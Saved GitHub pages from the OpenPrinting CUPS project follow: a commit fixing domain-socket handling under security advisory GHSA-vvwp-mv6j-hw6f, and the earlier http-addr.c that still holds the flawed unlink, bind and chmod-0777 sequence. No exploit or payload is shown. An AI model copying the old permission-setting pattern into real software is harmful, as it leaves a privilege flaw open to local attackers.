=== Content from github.com_71660902_20250111_071738.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenPrinting%2Fcups%2Fcommit%2Fff1f8a623e090dee8a8aadf12a6a4b25efac143d)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenPrinting%2Fcups%2Fcommit%2Fff1f8a623e090dee8a8aadf12a6a4b25efac143d)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=OpenPrinting%2Fcups)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[OpenPrinting](/OpenPrinting)
/
**[cups](/OpenPrinting/cups)**
Public

* [Notifications](/login?return_to=%2FOpenPrinting%2Fcups) You must be signed in to change notification settings
* [Fork
  208](/login?return_to=%2FOpenPrinting%2Fcups)
* [Star
   1.1k](/login?return_to=%2FOpenPrinting%2Fcups)

* [Code](/OpenPrinting/cups)
* [Issues
  27](/OpenPrinting/cups/issues)
* [Pull requests
  11](/OpenPrinting/cups/pulls)
* [Discussions](/OpenPrinting/cups/discussions)
* [Actions](/OpenPrinting/cups/actions)
* [Projects
  0](/OpenPrinting/cups/projects)
* [Wiki](/OpenPrinting/cups/wiki)
* [Security](/OpenPrinting/cups/security)
* [Insights](/OpenPrinting/cups/pulse)

Additional navigation options

* [Code](/OpenPrinting/cups)
* [Issues](/OpenPrinting/cups/issues)
* [Pull requests](/OpenPrinting/cups/pulls)
* [Discussions](/OpenPrinting/cups/discussions)
* [Actions](/OpenPrinting/cups/actions)
* [Projects](/OpenPrinting/cups/projects)
* [Wiki](/OpenPrinting/cups/wiki)
* [Security](/OpenPrinting/cups/security)
* [Insights](/OpenPrinting/cups/pulse)

## Commit

[Permalink](/OpenPrinting/cups/commit/ff1f8a623e090dee8a8aadf12a6a4b25efac143d)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-vvwp-mv6j-hw6f](https://github.com/OpenPrinting/cups/security/advisories/GHSA-vvwp-mv6j-hw6f "GHSA-vvwp-mv6j-hw6f")

[Browse files](/OpenPrinting/cups/tree/ff1f8a623e090dee8a8aadf12a6a4b25efac143d)
Browse the repository at this point in the history

```
Fix domain socket handling
```

* Loading branch information

[![@zdohnal](https://avatars.githubusercontent.com/u/17822565?s=40&v=4)](/zdohnal)

[zdohnal](/OpenPrinting/cups/commits?author=zdohnal "View all commits by zdohnal")
authored
Jun 11, 2024

2 parents
[7e388c3](/OpenPrinting/cups/commit/7e388c3f45741638bc64adf3d9cf88457425ee9a)
+
[a436956](/OpenPrinting/cups/commit/a436956f374b0fd7f5da9df482e4f5840fa1c0d2)

commit ff1f8a6

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**40 additions**
and
**9 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* cups

  + cups/http-addr.c
    [http-addr.c](#diff-7ad1a90873fca54ae10c73133619fc7e4d218c06d9792d4c27648761375f2d06)
* scheduler

  + scheduler/conf.c
    [conf.c](#diff-31afbe59f647fabc21a8e65590a2e1dadcbe339db4876a69bf25fc9a5ea8a12b)

## There are no files selected for viewing

29 changes: 20 additions & 9 deletions

29
[cups/http-addr.c](#diff-7ad1a90873fca54ae10c73133619fc7e4d218c06d9792d4c27648761375f2d06 "cups/http-addr.c")

Show comments

[View file](/OpenPrinting/cups/blob/ff1f8a623e090dee8a8aadf12a6a4b25efac143d/cups/http-addr.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -226,18 +226,29 @@ httpAddrListen(http\_addr\_t \*addr, // I - Address to bind to |
|  |  | mode\_t mask; // Umask setting |
|  |  |  |
|  |  | // Remove any existing domain socket file... |
|  |  | unlink(addr->un.sun\_path); |
|  |  | if ((status = unlink(addr->un.sun\_path)) < 0) |
|  |  | { |
|  |  | DEBUG\_printf("1httpAddrListen: Unable to unlink \"%s\": %s", addr->un.sun\_path, strerror(errno)); |
|  |  |  |
|  |  | // Save the current umask and set it to 0 so that all users can access |
|  |  | // the domain socket... |
|  |  | mask = umask(0); |
|  |  | if (errno == ENOENT) |
|  |  | status = 0; |
|  |  | } |
|  |  |  |
|  |  | // Bind the domain socket... |
|  |  | status = bind(fd, (struct sockaddr \*)addr, (socklen\_t)httpAddrLength(addr)); |
|  |  | if (!status) |
|  |  | { |
|  |  | // Save the current umask and set it to 0 so that all users can access |
|  |  | // the domain socket... |
|  |  | mask = umask(0); |
|  |  |  |
|  |  | // Restore the umask and fix permissions... |
|  |  | umask(mask); |
|  |  | chmod(addr->un.sun\_path, 0140777); |
|  |  | // Bind the domain socket... |
|  |  | if ((status = bind(fd, (struct sockaddr \*)addr, (socklen\_t)httpAddrLength(addr))) < 0) |
|  |  | { |
|  |  | DEBUG\_printf("1httpAddrListen: Unable to bind domain socket \"%s\": %s", addr->un.sun\_path, strerror(errno)); |
|  |  | } |
|  |  |  |
|  |  | // Restore the umask... |
|  |  | umask(mask); |
|  |  | } |
|  |  | } |
|  |  | else |
|  |  | #endif // AF\_LOCAL |
| Expand Down | |  |

20 changes: 20 additions & 0 deletions

20
[scheduler/conf.c](#diff-31afbe59f647fabc21a8e65590a2e1dadcbe339db4876a69bf25fc9a5ea8a12b "scheduler/conf.c")

Show comments

[View file](/OpenPrinting/cups/blob/ff1f8a623e090dee8a8aadf12a6a4b25efac143d/scheduler/conf.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3152,6 +3152,26 @@ read\_cupsd\_conf(cups\_file\_t \*fp) /\* I - File to read from \*/ |
|  |  | cupsd\_listener\_t \*lis; /\* New listeners array \*/ |
|  |  |  |
|  |  |  |
|  |  | /\* |
|  |  | \* If we are launched on-demand, do not use domain sockets from the config |
|  |  | \* file. Also check that the domain socket path is not too long... |
|  |  | \*/ |
|  |  |  |
|  |  | #ifdef HAVE\_ONDEMAND |
|  |  | if (\*value == '/' && OnDemand) |
|  |  | { |
|  |  | if (strcmp(value, CUPS\_DEFAULT\_DOMAINSOCKET)) |
|  |  | cupsdLogMessage(CUPSD\_LOG\_INFO, "Ignoring %s address %s at line %d - only using domain socket from launchd/systemd.", line, value, linenum); |
|  |  | continue; |
|  |  | } |
|  |  | #endif // HAVE\_ONDEMAND |
|  |  |  |
|  |  | if (\*value == '/' && strlen(value) > (sizeof(addr->addr.un.sun\_path) - 1)) |
|  |  | { |
|  |  | cupsdLogMessage(CUPSD\_LOG\_INFO, "Ignoring %s address %s at line %d - too long.", line, value, linenum); |
|  |  | continue; |
|  |  | } |
|  |  |  |
|  |  | /\* |
|  |  | \* Get the address list... |
|  |  | \*/ |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `ff1f8a6`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenPrinting%2Fcups%2Fcommit%2Fff1f8a623e090dee8a8aadf12a6a4b25efac143d) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_ec0b7461_20250111_071737.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenPrinting%2Fcups%2Fblob%2Faba917003c8de55e5bf85010f0ecf1f1ddd1408e%2Fcups%2Fhttp-addr.c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FOpenPrinting%2Fcups%2Fblob%2Faba917003c8de55e5bf85010f0ecf1f1ddd1408e%2Fcups%2Fhttp-addr.c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=OpenPrinting%2Fcups)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[OpenPrinting](/OpenPrinting)
/
**[cups](/OpenPrinting/cups)**
Public

* [Notifications](/login?return_to=%2FOpenPrinting%2Fcups) You must be signed in to change notification settings
* [Fork
  208](/login?return_to=%2FOpenPrinting%2Fcups)
* [Star
   1.1k](/login?return_to=%2FOpenPrinting%2Fcups)

* [Code](/OpenPrinting/cups)
* [Issues
  27](/OpenPrinting/cups/issues)
* [Pull requests
  11](/OpenPrinting/cups/pulls)
* [Discussions](/OpenPrinting/cups/discussions)
* [Actions](/OpenPrinting/cups/actions)
* [Projects
  0](/OpenPrinting/cups/projects)
* [Wiki](/OpenPrinting/cups/wiki)
* [Security](/OpenPrinting/cups/security)
* [Insights](/OpenPrinting/cups/pulse)

Additional navigation options

* [Code](/OpenPrinting/cups)
* [Issues](/OpenPrinting/cups/issues)
* [Pull requests](/OpenPrinting/cups/pulls)
* [Discussions](/OpenPrinting/cups/discussions)
* [Actions](/OpenPrinting/cups/actions)
* [Projects](/OpenPrinting/cups/projects)
* [Wiki](/OpenPrinting/cups/wiki)
* [Security](/OpenPrinting/cups/security)
* [Insights](/OpenPrinting/cups/pulse)

## Files

 aba9170
## Breadcrumbs

1. [cups](/OpenPrinting/cups/tree/aba917003c8de55e5bf85010f0ecf1f1ddd1408e)
2. /[cups](/OpenPrinting/cups/tree/aba917003c8de55e5bf85010f0ecf1f1ddd1408e/cups)
/
# http-addr.c

Copy path Blame  Blame
## Latest commit

## History

[History](/OpenPrinting/cups/commits/aba917003c8de55e5bf85010f0ecf1f1ddd1408e/cups/http-addr.c)835 lines (680 loc) · 20 KB aba9170
## Breadcrumbs

1. [cups](/OpenPrinting/cups/tree/aba917003c8de55e5bf85010f0ecf1f1ddd1408e)
2. /[cups](/OpenPrinting/cups/tree/aba917003c8de55e5bf85010f0ecf1f1ddd1408e/cups)
/
# http-addr.c

Top
## File metadata and controls

* Code
* Blame

835 lines (680 loc) · 20 KB[Raw](https://github.com/OpenPrinting/cups/raw/aba917003c8de55e5bf85010f0ecf1f1ddd1408e/cups/http-addr.c)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771772773774775776777778779780781782783784785786787788789790791792793794795796797798799800801802803804805806807808809810811812813814815816817818819820821822823824825826827828829830831832833834835//// HTTP address routines for CUPS.//// Copyright © 2923 by OpenPrinting.// Copyright © 2007-2021 by Apple Inc.// Copyright © 1997-2006 by Easy Software Products, all rights reserved.//// Licensed under Apache License v2.0. See the file "LICENSE" for more// information.//
#include "cups-private.h"#include <sys/stat.h>#ifdef HAVE\_RESOLV\_H# include <resolv.h>#endif // HAVE\_RESOLV\_H#ifdef \_\_APPLE\_\_# include <CoreFoundation/CoreFoundation.h># ifdef HAVE\_SCDYNAMICSTORECOPYCOMPUTERNAME# include <SystemConfiguration/SystemConfiguration.h># endif // HAVE\_SCDYNAMICSTORECOPYCOMPUTERNAME#endif // \_\_APPLE\_\_
//// 'httpAddrAny()' - Check for the "any" address.//// @deprecated@ @exclude all@//
int // O - 1 if "any", 0 otherwisehttpAddrAny(const http\_addr\_t \*addr) // I - Address to check{ return (httpAddrIsAny(addr) ? 1 : 0);}
//// 'httpAddrClose()' - Close a socket created by @link httpAddrConnect@ or// @link httpAddrListen@.//// Pass `NULL` for sockets created with @link httpAddrConnect2@ and the// listen address for sockets created with @link httpAddrListen@. This function// ensures that domain sockets are removed when closed.//// @since CUPS 2.0/OS 10.10@//
int // O - 0 on success, -1 on failurehttpAddrClose(http\_addr\_t \*addr, // I - Listen address or `NULL` int fd) // I - Socket file descriptor{#ifdef \_WIN32 if (closesocket(fd))#else if (close(fd))#endif // \_WIN32 return (-1);
#ifdef AF\_LOCAL if (addr && addr->addr.sa\_family == AF\_LOCAL) return (unlink(addr->un.sun\_path));#endif // AF\_LOCAL
 return (0);}
//// 'httpAddrEqual()' - Compare two addresses.//// @deprecated@ @exclude all@//
int // O - 1 if equal, 0 if nothttpAddrEqual(const http\_addr\_t \*addr1, // I - First address const http\_addr\_t \*addr2) // I - Second address{ return (httpAddrIsEqual(addr1, addr2) ? 1 : 0);}
//// 'httpAddrIsEqual()' - Compare two addresses.//// @since CUPS 2.5@//
bool // O - `true` if equal, `false` if nothttpAddrIsEqual( const http\_addr\_t \*addr1, // I - First address const http\_addr\_t \*addr2) // I - Second address{ if (!addr1 && !addr2) return (1);
 if (!addr1 || !addr2) return (0);
 if (addr1->addr.sa\_family != addr2->addr.sa\_family) return (0);
#ifdef AF\_LOCAL if (addr1->addr.sa\_family == AF\_LOCAL) return (!strcmp(addr1->un.sun\_path, addr2->un.sun\_path));#endif // AF\_LOCAL
#ifdef AF\_INET6 if (addr1->addr.sa\_family == AF\_INET6) return (!memcmp(&(addr1->ipv6.sin6\_addr), &(addr2->ipv6.sin6\_addr), 16));#endif // AF\_INET6
 return (addr1->ipv4.sin\_addr.s\_addr == addr2->ipv4.sin\_addr.s\_addr);}
//// 'httpAddrIsAny()' - Check for the "any" address.//// @since CUPS 2.5@//
bool // O - `true` if "any" address, `false` otherwisehttpAddrIsAny(const http\_addr\_t \*addr) // I - Address to check{ if (!addr) return (false);
#ifdef AF\_INET6 if (addr->addr.sa\_family == AF\_INET6 && IN6\_IS\_ADDR\_UNSPECIFIED(&(addr->ipv6.sin6\_addr))) return (true);#endif // AF\_INET6
 if (addr->addr.sa\_family == AF\_INET && ntohl(addr->ipv4.sin\_addr.s\_addr) == 0x00000000) return (true);
 return (false);}
//// 'httpAddrLength()' - Return the length of the address in bytes.//// @deprecated@ @exclude all@//
int // O - Length in byteshttpAddrLength(const http\_addr\_t \*addr) // I - Address{ return ((int)httpAddrGetLength(addr));}
//// 'httpAddrGetLength()' - Return the length of the address in bytes.//// @since CUPS 2.5@//
size\_t // O - Length in byteshttpAddrGetLength( const http\_addr\_t \*addr) // I - Address{ if (!addr) return (0);
#ifdef AF\_INET6 if (addr->addr.sa\_family == AF\_INET6) return (sizeof(addr->ipv6)); else#endif // AF\_INET6#ifdef AF\_LOCAL if (addr->addr.sa\_family == AF\_LOCAL) return ((size\_t)(offsetof(struct sockaddr\_un, sun\_path) + strlen(addr->un.sun\_path) + 1)); else#endif // AF\_LOCAL if (addr->addr.sa\_family == AF\_INET) return (sizeof(addr->ipv4)); else return (0);}
//// 'httpAddrListen()' - Create a listening socket bound to the specified// address and port.//// @since CUPS 1.7/macOS 10.9@//
int // O - Socket or -1 on errorhttpAddrListen(http\_addr\_t \*addr, // I - Address to bind to int port) // I - Port number to bind to{ int fd = -1, // Socket val, // Socket value status; // Bind status
 // Range check input... if (!addr || port < 0) return (-1);
 // Make sure the network stack is initialized... httpInitialize();
 // Create the socket and set options... if ((fd = socket(addr->addr.sa\_family, SOCK\_STREAM, 0)) < 0) { \_cupsSetHTTPError(HTTP\_STATUS\_ERROR); return (-1); }
 val = 1; setsockopt(fd, SOL\_SOCKET, SO\_REUSEADDR, CUPS\_SOCAST &val, sizeof(val));
#ifdef IPV6\_V6ONLY if (addr->addr.sa\_family == AF\_INET6) setsockopt(fd, IPPROTO\_IPV6, IPV6\_V6ONLY, CUPS\_SOCAST &val, sizeof(val));#endif // IPV6\_V6ONLY
 // Bind the socket...#ifdef AF\_LOCAL if (addr->addr.sa\_family == AF\_LOCAL) { mode\_t mask; // Umask setting
 // Remove any existing domain socket file... unlink(addr->un.sun\_path);
 // Save the current umask and set it to 0 so that all users can access // the domain socket... mask = umask(0);
 // Bind the domain socket... status = bind(fd, (struct sockaddr \*)addr, (socklen\_t)httpAddrLength(addr));
 // Restore the umask and fix permissions... umask(mask); chmod(addr->un.sun\_path, 0140777); } else#endif // AF\_LOCAL { httpAddrSetPort(addr, port);
 status = bind(fd, (struct sockaddr \*)addr, (socklen\_t)httpAddrLength(addr)); }
 if (status) { \_cupsSetHTTPError(HTTP\_STATUS\_ERROR);
 close(fd);
 return (-1); }
 // Listen... if (listen(fd, INT\_MAX)) { \_cupsSetHTTPError(HTTP\_STATUS\_ERROR);
 close(fd);
 return (-1); }
 // Close on exec...#ifndef \_WIN32 fcntl(fd, F\_SETFD, fcntl(fd, F\_GETFD) | FD\_CLOEXEC);#endif // !\_WIN32
#ifdef SO\_NOSIGPIPE // Disable SIGPIPE for this socket. val = 1; setsockopt(fd, SOL\_SOCKET, SO\_NOSIGPIPE, CUPS\_SOCAST &val, sizeof(val));#endif // SO\_NOSIGPIPE
 return (fd);}
//// 'httpAddrLocalhost()' - Check for the local loopback address.//// @deprecated@ @exclude all@//
int // O - 1 if local host, 0 otherwisehttpAddrLocalhost( const http\_addr\_t \*addr) // I - Address to check{ return (httpAddrIsLocalhost(addr) ? 1 : 0);}
//// 'httpAddrIsLocalhost()' - Check for the local loopback address.//// @since CUPS 2.5@//
bool // O - `true` if local host, `false` otherwisehttpAddrIsLocalhost( const http\_addr\_t \*addr) // I - Address to check{ if (!addr) return (true);
#ifdef AF\_INET6 if (addr->addr.sa\_family == AF\_INET6 && IN6\_IS\_ADDR\_LOOPBACK(&(addr->ipv6.sin6\_addr))) return (true);#endif // AF\_INET6
#ifdef AF\_LOCAL if (addr->addr.sa\_family == AF\_LOCAL) return (true);#endif // AF\_LOCAL
 if (addr->addr.sa\_family == AF\_INET && (ntohl(addr->ipv4.sin\_addr.s\_addr) & 0xff000000) == 0x7f000000) return (true);
 return (false);}
//// 'httpAddrLookup()' - Lookup the hostname associated with the address.//// @since CUPS 1.2/macOS 10.5@//
char \* // O - Host namehttpAddrLookup( const http\_addr\_t \*addr, // I - Address to lookup char \*name, // I - Host name buffer int namelen) // I - Size of name buffer{ int error; // Any error from getnameinfo \_cups\_globals\_t \*cg = \_cupsGlobals(); // Global data
 DEBUG\_printf("httpAddrLookup(addr=%p, name=%p, namelen=%d)", (void \*)addr, (void \*)name, namelen);
 // Range check input... if (!addr || !name || namelen <= 2) { if (name && namelen >= 1) \*name = '\0';
 return (NULL); }
#ifdef AF\_LOCAL if (addr->addr.sa\_family == AF\_LOCAL) { cupsCopyString(name, addr->un.sun\_path, (size\_t)namelen); return (name); }#endif // AF\_LOCAL
 // Optimize lookups for localhost/loopback addresses... if (httpAddrLocalhost(addr)) { cupsCopyString(name, "localhost", (size\_t)namelen); return (name); }
#ifdef HAVE\_RES\_INIT // STR #2920: Initialize resolver after failure in cups-polld // // If the previous lookup failed, re-initialize the resolver to prevent // temporary network errors from persisting. This \*should\* be handled by // the resolver libraries, but apparently the glibc folks do not agree. // // We set a flag at the end of this function if we encounter an error that // requires reinitialization of the resolver functions. We then call // res\_init() if the flag is set on the next call here or in httpAddrLookup(). if (cg->need\_res\_init) { res\_init();
 cg->need\_res\_init = 0; }#endif // HAVE\_RES\_INIT
 // STR #2486: httpAddrLookup() fails when getnameinfo() returns EAI\_AGAIN // // FWIW, I think this is really a bug in the implementation of // getnameinfo(), but falling back on httpAddrString() is easy to do... if ((error = getnameinfo(&addr->addr, (socklen\_t)httpAddrLength(addr), name, (socklen\_t)namelen, NULL, 0, 0)) != 0) { if (error == EAI\_FAIL) cg->need\_res\_init = 1;
 return (httpAddrGetString(addr, name, (size\_t)namelen)); }
 DEBUG\_printf("1httpAddrLookup: returning \"%s\"...", name);
 return (name);}
//// 'httpAddrFamily()' - Get the address family of an address.//// @deprecated@ @exclude all@//
int // O - Address familyhttpAddrFamily(http\_addr\_t \*addr) // I - Address{ return (httpAddrGetFamily(addr));}
//// 'httpAddrGetFamily()' - Get the address family of an address.//
int // O - Address familyhttpAddrGetFamily(http\_addr\_t \*addr) // I - Address{ if (addr) return (addr->addr.sa\_family); else return (0);}
//// 'httpAddrPort()' - Get the port number associated with an address.//// @deprecated@ @exclude all@//
int // O - Port numberhttpAddrPort(http\_addr\_t \*addr) // I - Address{ return (httpAddrGetPort(addr));}
//// 'httpAddrGetPort()' - Get the port number associated with an address.//// @since CUPS 2.5@//
int // O - Port numberhttpAddrGetPort(http\_addr\_t \*addr) // I - Address{ if (!addr) return (-1);#ifdef AF\_INET6 else if (addr->addr.sa\_family == AF\_INET6) return (ntohs(addr->ipv6.sin6\_port));#endif // AF\_INET6 else if (addr->addr.sa\_family == AF\_INET) return (ntohs(addr->ipv4.sin\_port)); else return (0);}
//// 'httpAddrSetPort()' - Set the port number associated with an address.//// @since CUPS 2.5@//
voidhttpAddrSetPort(http\_addr\_t \*addr, // I - Address int port) // I - Port{ if (!addr || port <= 0) return;
#ifdef AF\_INET6 if (addr->addr.sa\_family == AF\_INET6) addr->ipv6.sin6\_port = htons(port); else#endif // AF\_INET6 if (addr->addr.sa\_family == AF\_INET) addr->ipv4.sin\_port = htons(port);}
//// 'httpAddrString()' - Convert an address to a numeric string.//// @deprecated@ @exclude all@//
char \* // O - Numeric address stringhttpAddrString(const http\_addr\_t \*addr, // I - Address to convert char \*s, // I - String buffer int slen) // I - Length of string{ return (httpAddrGetString(addr, s, (size\_t)slen));}
//// 'httpAddrGetString()' - Convert an address to a numeric string.//// @since CUPS 2.5@//
char \* // O - Numeric address stringhttpAddrGetString( const http\_addr\_t \*addr, // I - Address to convert char \*s, // I - String buffer size\_t slen) // I - Length of string{ DEBUG\_printf("httpAddrGetString(addr=%p, s=%p, slen=%u)", (void \*)addr, (void \*)s, (unsigned)slen);
 // Range check input... if (!addr || !s || slen <= 2) { if (s && slen >= 1) \*s = '\0';
 return (NULL); }
#ifdef AF\_LOCAL if (addr->addr.sa\_family == AF\_LOCAL) { if (addr->un.sun\_path[0] == '/') cupsCopyString(s, addr->un.sun\_path, (size\_t)slen); else cupsCopyString(s, "localhost", (size\_t)slen); } else#endif // AF\_LOCAL if (addr->addr.sa\_family == AF\_INET) { unsigned temp; // Temporary address
 temp = ntohl(addr->ipv4.sin\_addr.s\_addr);
